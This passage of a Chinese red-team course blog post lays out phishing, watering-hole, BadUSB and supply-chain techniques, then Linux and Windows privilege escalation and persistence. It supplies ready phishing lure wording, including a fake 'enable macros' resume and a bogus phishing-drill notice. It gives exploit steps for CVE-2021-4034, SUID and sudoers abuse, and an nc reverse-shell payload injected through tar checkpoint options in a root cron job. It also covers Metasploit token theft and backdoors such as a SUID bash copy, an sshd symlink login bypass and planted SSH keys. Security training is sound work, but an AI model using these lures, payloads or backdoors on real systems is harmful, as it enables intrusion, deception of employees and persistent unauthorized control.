href="https://github.com/cwkiller/Pentest_Dic">https://github.com/cwkiller/Pentest_Dic</a><br><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<p>宏(简历或其他)<br>投递方式使用docx简历，让受害者点击允许运行宏准备一份简历，背景为虚化的简历图片，在上方用蓝底白字加一段文字.<br>•Office:本文档看起来是低版本word编写。<br>为了完整显示此文档，请点击”启动编辑”和”启用宏内容”。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162933534.png" alt="image-20220707162933534"></p>
<p>商务合作<br>合作是一个公司必不可少的业务之一，我们可以在网站下方找一些合作邮箱，以合作的名义去进行合作邮件钓鱼。要注意的点是：公司尽量是和受害者公司同一区域的，如果随便找个区域的公司，并且所涉及的业务并未覆盖到受害者公司，很容易被无视。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162958084.png" alt="image-20220707162958084">]</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163012452.png" alt="image-20220707163012452"></p>
<p>很多公司都会在比如拉勾网、智联招聘进行工作招聘，这种情况下，我们也可以在这些第三方平台上，与面试者面对面的沟通交流，取得信任，最后进行钓鱼攻击</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163040786.png" alt="image-20220707163040786"></p>
<p>可信站点附件中转<br>我们进行钓鱼攻击时，会常常把木马直接放在邮件正文中，但是对方邮件网关可能有杀软沙箱，会拦截带有恶意文件的邮箱，这时候可以尝试对文件进行加密处理除了加密处理外，还可以使⽤可信站点作为中转，⽐如我准备钓⻥的员⼯是{domain}.com公司下的，那如果我们把附件传到*.{domain}.com域下的话，当对⽅看到下载地址是{domain}.com域的话，下载点击的成功率是不是更⼤了点呢？</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163113940.png" alt="image-20220707163113940"></p>
<p>放假通知<br>节假日前期可尝试该手段进行钓鱼</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163131206.png" alt="image-20220707163131206"></p>
<p>钓鱼安全演练通告<br>以钓鱼安全演练的名义，通告企业人员，存在安全意识薄弱的现象，更容易欺骗内部人员点击。<br>话术<br>•各位同事好：（时间，可以是上一次真实发送钓鱼邮件的时间）信息部协调第三方安全厂商做了一次钓鱼邮件安全演练，发现有部分同事安全意识薄弱，现在对此进行通告。 详情请查阅附件。<br>谢谢！<br>鱼饵投递方式<br>•exe、word宏等</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163202243.png" alt="image-20220707163202243"></p>
<hr>
<p><strong>水坑攻击</strong></p>
<p>页面植入JS，进一步获取内网主机权限。修改页面植入时需要申请，大概率不允许（拿到权限修改口令，修改配置文件，修改页面误导等操作）前台存储xss漏洞或者云上目标webshell但无法继续深入的情况下，可以考虑使用水坑攻击。在目标受害者经常访问的站点上部署木马诱惑目标下载执行上线。<br>Flash水坑+配合xss使用<br>•<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a><br>Pricking 是一个自动化部署水坑和网页钓鱼的项目。<br>•<a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/Pricking">https://github.com/Rvn0xsy/Pricking</a></p>
<hr>
<p><strong>BadUSB</strong></p>
<p>BadUSB是利用伪造HID设备执行攻击载荷的一种攻击方式。HID设备通常指的就是键盘鼠标等与人交互的设备，用户插入BadUSB，就会自动执行预置在固件中的恶意代码。Bad-Usb插入后，会模拟键盘鼠标对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载其他代码并于后台静默运行。这些代码功能包括：窃取信<br>息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。badUSB简单免杀一秒上线CobaltStrike<br>•<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ">https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ</a><br>Badusb初识<br>•<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6435">https://xz.aliyun.com/t/6435</a><br>BasUSB实现后台静默执行上线CobaltStrike<br>•<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw">https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw</a></p>
<hr>
<p><strong>供应链攻击</strong></p>
<p>供应链攻击是指一种传播间谍软件的方式，一般在开发工具、源代码、安装包下载、升级客户端时、厂商预留后门、传输链等环节上进行污染。通过篡改服务器这些组件进行侵入并植入病毒或恶意代码传播将恶意软件传播给前往官网下载软件的用户。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163323554.png" alt="image-20220707163323554"></p>
<p>•攻击供应链-&gt;注入恶意代码(应用、app)–&gt;访问某个IP地址–&gt;下载主体恶意程序–&gt;实现远程控制<br>•直接篡改应用源代码(载入木马)–&gt;下发用户–&gt;用户使用-&gt;访问某个IP地址–&gt;下载主体恶意程序–&gt;实现远程控制<br>•直接篡改应用源代码（建立特权账户或端口服务）–&gt;用户使用 –&gt;被厂商（攻击者）利用 –&gt;访问某个IP地址-&gt;下载主体恶意程序-&gt;实现远程控制<br>•直接篡改应用源代码（篡改浏览器）–&gt;用户使用 –&gt;流量劫持–&gt;利用源代码直接进行远程控制<br>•用户使用升级更新–&gt;被劫持–&gt;下发恶意程序–&gt;访问某个IP地址–&gt;下载主体恶意程序–&gt;实现远程控制</p>
<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="提-权-相-关"><a href="#提-权-相-关" class="headerlink" title="提 权 相 关"></a>提 权 相 关</h2><p><strong>linux提权</strong></p>
<p>通过命令执行漏洞获取的一个反弹shell或是通过Web漏洞获取了一个Webshell后，一般情况下权限都较低。在执行一些重要敏感的操作或是对重要的文件进行修改时无法正常进行，便需要进行提权。Linux中安装的数据库、中间件等一般都不是以root用户启动的，通过数据库或是中间件获取到的权限是是低权限的。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130425849.png" alt="image-20220709130425849"></p>
<hr>
<p><strong>linux提权—pkexec提权</strong></p>
<p>漏洞简介<br>polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令。polkit 的 pkexec 程序中存在一个本地权限提升漏洞。当前版本的pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。利用成功后，会导致本地特权升级，非特权用户获得管理员权限。<br>•影响范围：目前主流Linux版本均受影响</p>
<p>•git clone<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a><br>•cd CVE-2021-4034<br>•make<br>•./cve-2021-4034<br>•whoami</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130553042.png" alt="image-20220709130553042"></p>
<hr>
<p><strong>linux提权–内核漏洞提权</strong></p>
<p>内核是系统的心脏，是运行程序和管理磁盘等硬件设备的核心程序。是硬件设备和软件程序间的抽象层。 Linux内核的开发和规范一直是由Linus领导的开发小组控制着，版本是惟一的。开发小组每隔一段时间公布新的版本或修订版，从1991年10月开始，Linus向世界公开发布的内核0.0.2版本到目前最新的内核5.911版本，Linux的功能越来越强大。<br>•uname -a 打印所有可用的系统信息<br>•uname -r 内核版本<br>•uname -n 系统主机名。<br>•uname -m 查看系统内核架构（64位/32位）<br>•hostname 系统主机名<br>•cat /proc/version 内核信息</p>
<p><strong>脏牛漏洞</strong><br>脏牛漏洞(CVE-2016-5195)是一个影响2007年-2016年长达9年发行的Linux系统的提权漏洞，恶意用户可以利用条件竞争获取ROOT权限。<br>•<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a><br>影响版本：<br>•Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）<br>检测内核版本<br>•lsb_release –a # 查看系统发行版本<br>•uname –a # 查看内核版本<br>下载，编译生成exp文件<br>•Make<br>执行，返回一个root权限的shell。</p>
<p>对于 Linux 提权的 CVE 有很多，可以使用一些工具帮助我们快速的发现当前 Linux 可能存在的提权漏洞。<br>•<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits.git">https://github.com/SecWiki/linux-kernel-exploits.git</a><br>•chmod +x linux-exploit-suggester.sh<br>•./linux-exploit-suggester.sh<br>Searchsploit<br>•MSF中搜索EXP的模块</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130759510.png" alt="image-20220709130759510"></p>
<hr>
<p><strong>linux提权—利用SUID提权</strong></p>
<p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。<br>在Linux中查找可以用来提权的SUID文件<br>•find / -perm -u=s -type f 2&gt;/dev/null<br>•find / -user root -perm -4000-print2&gt;/dev/null<br>•find / -user root -perm -4000-exec ls -ldb {} ;<br>常见suid提权文件<br>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130900575.png" alt="image-20220709130900575"></p>
<p><strong>利用SUID提权实验</strong></p>
<p>利用find文件提权<br>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。<br>首先要给find设当SUID权限<br>•chmod u+s /usr/bin/find<br>Find命令是以Suid权限运行，则将通过find执行的所有命令都会以root权限执行<br>•/usr/bin/find pass.txt -exec whoami ;</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131138207.png" alt="image-20220709131138207"></p>
<p>可用作Linux提权的命令及其姿势:<br>•Find find pentestlab -exec whoami ;<br>•Vim vim.tiny /etc/shadow<br>•awk awk ‘BEGIN{system(“whoami”)}’<br>•curl curl file:///etc/shadow<br>•Bash bash -p<br>•Less less /etc/passwd<br>•Nmap nmap –interactive </p>
<hr>
<p><strong>linux提权—利用SUDO提权</strong></p>
<p>普通用户在使用sudo执行命令的过程中，会以root方式执行命令。在很多场景里，管理员为了运维管理方便，sudoer配置文件错误导致提权。<br>设置sudo免密码:<br>•vi /etc/sudoers<br>在最后一行添加：<br>•bypass ALL=(ALL:ALL) NOPASSWD:ALL<br>•sudo –l<br>显示用户已允许以root用户身份执行所有此二进制文件而无需密码。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131200736.png" alt="image-20220709131200736"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131214080.png" alt="image-20220709131214080"></p>
<p>•<a target="_blank" rel="noopener" href="https://gtfobins.github.io/![image-20220709131242351](./HW%E8%AF%BE%E7%A8%8B/image-20220709131242351.png)">https://gtfobins.github.io/![image-20220709131242351](./HW%E8%AF%BE%E7%A8%8B/image-20220709131242351.png)</a></p>
<hr>
<p><strong>linux提权—计划任务</strong></p>
<p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出。<br>•ls -l /etc/cron*<br>默认这些程序是以root权限执行，如果有任意用户可写的脚本，我们就可以修改脚本等回连rootshell了。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131348728.png" alt="image-20220709131348728"></p>
<p>提权：<br>•#查看定时任务<br>•cat /etc/crontab<br>#查看/etc/cron.daily/backup权限<br>•ls -l /etc/cron.daily/backup<br>#查看内容<br>•cat /etc/cron.daily/backup<br>#这个定时任务的执行权限是root，将用户家目录下的文件备份到/etc/backups/下，使用通配符*</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131430535.png" alt="image-20220709131430535"></p>
<p>反弹shell<br>payload生成<br>•msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 -R raw<br>将payload写入shell.sh，并赋予执行权限<br>•echo “mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0&lt;/tmp/jvenbd | /bin/sh &gt;/tmp/jvenbd 2&gt;&1;<br>    rm /tmp/jvenbd” &gt; shell.sh &amp;&amp; chmod +x shell.sh<br>再创建两个文件：–checkpoint-action=exec=sh shell.sh 和 –checkpoint=1<br>•echo &gt; “–checkpoint-action=exec=sh shell.sh”<br>•echo &gt; “–checkpoint=1”</p>
<p>–checkpoint-action选项：用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项–checkpoint=1 和 –checkpoint-action=exec=sh shell.sh作为命令行选项交给了tar程序<br>•nc -lvvp 8888开启本地监听，等待定时任务的反弹连接</p>
<hr>
<p><strong>linux提权—配置错误引发提权</strong></p>
<p>手动找如果对Linux系统不熟悉的话基本是找不到的，所以可以利用工具去查找<br>•<a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>•<a target="_blank" rel="noopener" href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br>列出了所有的可写文件，如果找到有配置问题的便可以进行提权操作。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131845994.png" alt="image-20220709131845994"></p>
<hr>
<p><strong>linux提权—第三方服务提权</strong></p>
<p>NFS提权<br>NFS：Network File System即网络文件系统，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。2049端口，对应nfs服务，当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。</p>
<p>nmap 扫描靶机<br>•nmap -sT -T4 192.168.123.213<br>攻击机上安装nfs客户端工具<br>•apt-get install nfs-common<br>使用showmount检索靶机文件夹列表<br>•showmount -e 192.168.123.213<br>•Export list for 192.168.123.213:<br>•/home/peter *<br>挂载peter home目录<br>•mkdir /mnt/peter<br>•mount 192.168.123.213:/home/peter /mnt/peter </p>
<p>写入ssh公钥<br>[攻击机]ssh-keygen生成公私钥对<br>•ssg-keygen<br>创建.ssh目录<br>•peter@kali:/mnt/peter$ mkdir .ssh<br>传输public key<br>•peter@kali:/mnt/peter$ cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys<br>设置权限<br>•peter@kali:/mnt/peter/.ssh$ chmod 700 ../.ssh/<br>•peter@kali:/mnt/peter/.ssh$ chmod 600 authorized_keys<br>使用私钥登录</p>
<hr>
<p><strong>linux提权—相关工具</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits.git">https://github.com/SecWiki/linux-kernel-exploits.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb.git">https://github.com/offensive-security/exploitdb.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester.git">https://github.com/mzet-/linux-exploit-suggester.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2.git">https://github.com/jondonas/linux-exploit-suggester-2.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/belane/linux-soft-exploit-suggester.git">https://github.com/belane/linux-soft-exploit-suggester.git</a><br>•linuxprivchecker： <a target="_blank" rel="noopener" href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br>•<a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz">http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz</a><br>•<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><br>•<a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p>
<hr>
<p><strong>windows提权</strong></p>
<p>windows在日常的渗透中经常遇到，而在内网之前，经常会在所拿到的跳板机进行提权，这样后面横向，内网才能更好的展开（抓hash，必须得系统或管理员权限）。<br>Windows常用的提权方法有：<br>•系统内核溢出漏洞提权<br>•数据库提权<br>•错误的系统配置提权<br>•组策略首选项提权<br>•窃取令牌提权<br>•bypassuac提权<br>•第三方软件/服务提权</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709132224419.png" alt="image-20220709132224419"></p>
<hr>
<p><strong>windows提权–系统权限划分</strong></p>
<p>在Windows系统中，权限大概分为四种，分别是<br>•User：普通用户权限<br>•Administrator：管理员权限，可以利用Windows机制提升为System权限<br>•System：系统权限<br>•TrustedInstaller：Windows中最高权限。有些文件，连System权限也无法修改，只能TrustedInstaller权限修改。</p>
<p>安全描述符<br>当一个对象呗创建时，系统将为其分配安全描述符，安全描述符包含了该对象的属主对该对象所配置的一些安全属性和策略。安全描述符由4部分组成：<br>•SID（表示该对象所有用的SID）<br>•DACL（表示该对象的访问控制策略）<br>•SACL（表示该对象的访问行为的审计策略）<br>•Flag（其他标志信息）<br>SID：Secure Identifier(安全标识符)，每个用户和账户组都有一个唯一的SID，他是用户、用户组和计算机账户的唯一标识符</p>
<p>windows token<br>•Windows安全模型中，有两个角色，一个是访问者（进程），一个是被访问者（资源）<br>•所谓的资源可以是文件，目录，注册表，管道，命名句柄，进程线程<br>•每个资源都有一个安全描述符，安全描述符当中包含了ACL（ACE）（访问控制列表）<br>•访问控制列表中每条规则（ACE）都对应记录着一个SID被允许和拒绝的操作（读、写、执行）<br>•访问者为了访问某一个资源，显然也需要一个身份的认证<br>Windows Access Token（访问令牌）<br>他是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这就解释了A用户创建一个进程而该进程没有B用户的权限。当用户注释后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只会在重启机器后才会清除。</p>
<p>Windows Access Token（访问令牌）<br>他是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这就解释了A用户创建一个进程而该进程没有B用户的权限。当用户注释后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只会在重启机器后才会清除。<br>Access Token分为两种(主令牌、模拟令牌)<br>•授权令牌(Delegation token)：交互式会话登陆(例：本地用户登陆、用户桌面等….)<br>•模拟令牌(lmpersonation token)：非交互式登陆(例：net user、访问共享文件)<br>用户双击运行一个程序都会拷贝“explorer.exe”的Access Token<br>用户注销后系统将会使主令牌切换到模拟令牌，不会将令牌清除，只会在重启机器后才会清除</p>
<hr>
<p><strong>windows提权—令牌窃取</strong></p>
<p>默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前shell的访问级别，如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。<br>MSF中内置了令牌窃取工具incognito，我们直接使用：<br>•use incognito （进入incognito模块）<br>•list_tokens -u （列出令牌）<br>•impersonate_token “NT AUTHORITY\SYSTEM“<br>调用windows api进行窃取token<br>•<a target="_blank" rel="noopener" href="https://github.com/Aquilao/GoTokenTheft">https://github.com/Aquilao/GoTokenTheft</a><br>对于令牌窃取很多人可能会存在着一些误解，这不属于一种提权方法，当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709132610636.png" alt="image-20220709132610636"></p>
<hr>
<p><strong>windows提权—Potato家族提权</strong></p>
<p>烂土豆 原名RottenPotato，国人做了优化为JuicyPotato。<br>原理就是NLTM中继。 通过DCOM call来使服务向攻击者监听的端口发起连接并进行NTLM认证，这个服务如BITS。该方法利用的是SMB-&gt;SMB NTLM中继。<br>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>土豆提权的利用条件<br>•需要支持 SeImpersonate 或者 SeAssignPrimaryToken 权限（通常情况下 IIS、MSSQL 具有这两个权限）<br>•开启 DCOM<br>•本地支持 RPC 或者远程服务器支持 RPC 并能成功登录<br>•能够找到可用的 COM 对象</p>
<p>各版本的土豆提权工具（利用方法)<br>•RottenPotato<br>•JuicyPotato（RottenPotatoNG 加强版）<br>•SweetPotato<br>•BadPotato<br>•MultiPotato<br>若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
<p>Msf<br>前提还是先拿到目标的一个shell。然后将potato.exe到目标机器中的C:/目录下然后执行<br>•use incognito# 加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)<br>•list_tokens -u# 列出目标机器用户的可用令牌<br>•execute -cH -f c:/potato.exe# 创建新的进程<br>•list_tokens -uimpersonate_token “NT AUTHORITY\SYSTEM”</p>
<p>CobaltStike<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709132836479.png" alt="image-20220709132836479"></p>
<hr>
<p><strong>windows提权—内核漏洞提权</strong></p>
<p>利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，攻击者通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp<br>注意，只要对应的补丁号加上对应的系统的版本的提权exp才可以成功，有时候如果查找到提权exp提权不成功，那么就可以查看是不是系统版本没对应上，且不排除一些提权漏洞利用需要相应的环境。</p>
<hr>
<p><strong>windows提权—系统内核溢出漏洞提权</strong></p>
<p>手工查找补丁情况<br>•systeminfo<br>•Wmic qfe get Caption,Description,HotFixID,InstalledOn<br>MSF后渗透扫描<br>•post/windows/gather/enum_patches<br>•post/multi/recon/local_exploit_suggester<br>windows exploit suggester<br>•<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a><br>powershell中的sherlock脚本<br>•Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块</p>
<p>查找到缺失的补丁后，对照相应的系统版本，查找对应的exp<br>•<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br>•<a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/">https://github.com/Heptagrams/Heptagram/tree/master/Windows/</a><br>Elevation<br>•<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>•<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a><br>•………..</p>
<hr>
<p><strong>windows提权—可信任服务路径</strong></p>
<p>windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。<br>•C:\Program Files\Some Folder\Service.exe<br>对于上面文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，<br>windows会依次尝试确定和执行下面的程序：<br>•C:\Program.exe<br>•C:\Program Files\Some.exe<br>•C:\Program Files\Some Folder\Service.exe<br>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，我们的恶意程序就会以system权限运行</p>
<p>通过msf模块攻击<br>•search service_path<br>•use ID<br>•show options<br>•set session ID<br>•exploit</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133106409.png" alt="image-20220709133106409"></p>
<hr>
<p><strong>windows提权—组策略首选项提权</strong></p>
<p>利用手法：<br>#Powershell获取cpassword<br>•Get-GPPPassword.ps1<br>#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。<br>kali gpp-decrypt命令破解密码<br>#Msf<br>•run post/windows/gather/credentials/gpp<br>#Empire<br>•usemodule privesc/gpp</p>
<hr>
<p><strong>windows提权—DLL劫持提权</strong></p>
<p>Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：<br>•1.应用程序加载的目录<br>•2.C:\Windows\System32<br>•3.C:\Windows\System<br>•4.C:\Windows<br>•5.当前工作目录Current Working Directory，CWD<br>•6.在PATH环境变量的目录（先系统后用户）</p>
<p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功<br>dll劫持提权需要特定软件应用的控制权限及启用配合，复杂鸡肋，AlwaysInstallElevated提权默认禁用配置，利用成功机会很少</p>
<hr>
<p><strong>windows提权—bypassUAC提权</strong></p>
<p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统的效果。<br>主要用于隔离administrator和user的权限<br>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p>
<p>一些没有管理员权限无法完成的操作：<br>•注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）<br>•加载设备驱动程序<br>•DLL注入<br>•修改系统时间（时钟）<br>•修改用户帐户控制设置<br>•修改受保护的目录（例如Windows文件夹，Program Files）<br>•计划任务（例如，以管理员权限自动启动）<br>•UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件，而是在没有用户许可下对恶意软件的未授权行为进行掌控。<br>•<a target="_blank" rel="noopener" href="https://github.com/Drunkmars/BypassUAC">https://github.com/Drunkmars/BypassUAC</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133348119.png" alt="image-20220709133348119"></p>
<p>目前公开的bypass uac的方法<br>•白名单提权机制 ；如：Wusa.exe Bypass UAC，infDefault.exe Bypass UAC，cmstp,exe<br>•Bypass UAC<br>•COM接口<br>•计划任务<br>•DLL劫持<br>•windows 自身提权漏洞<br>UACME 目前已经支持了72 种 ByPassUAC 的方法。<br>•UACME 项目地址：<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME.git">https://github.com/hfiref0x/UACME.git</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133417229.png" alt="image-20220709133417229"></p>
<hr>
<p><strong>windows提权—其他手法</strong></p>
<p>去寻找系统高权限运行的用户，服务，软件，程序，脚本，通过一定手法，比如cve，进程注入，dll劫持，实在不行社工。扎实的基础+奇妙的思路+敏捷的手法=system权限</p>
<h2 id="权-限-维-持"><a href="#权-限-维-持" class="headerlink" title="权 限 维 持"></a>权 限 维 持</h2><p><strong>权限维持介绍</strong></p>
<p>只要目标没有发现我们的攻击⾏为，可以⻓久保持⽬标的可控性，都可以称为权限维持。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133531884.png" alt="image-20220709133531884"></p>
<hr>
<p><strong>Linux权限维持—SUID Shell</strong></p>
<p>SUID Shell是一种可用于以拥有者权限运行的shell。<br>以 root 用户权限执行下面的命令。<br>•cp /bin/bash /tmp/shell<br>•chmod u+s /tmp/shell      #给程序的所有者suid权限,可以像root用户那样启动</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133621192.png" alt="image-20220709133621192"></p>
<p>在使用普通用户权限的时候，执行以下命令就能获取 root 权限。<br>•/tmp/shell -p</p>
<hr>
<p><strong>Linux权限维持—软链接</strong></p>
<p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:<br>•ln -sf /usr/sbin/sshd /tmp/su<br>•/tmp/su -oPort=888<br>•ssh <a href="mailto:&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;">&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;</a> -p 888</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133729216.png" alt="image-20220709133729216"></p>
<hr>
<p><strong>Linux权限维持—公钥免密登陆</strong></p>
<p>•ssh-keygen -t rsa //生成公钥<br>•echo id_rsa.pub &gt;&gt; .ssh/authorized_keys //将id_rsa.pub内容放到目标.ssh/authorized_keys里</p>
<p>生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。</p>
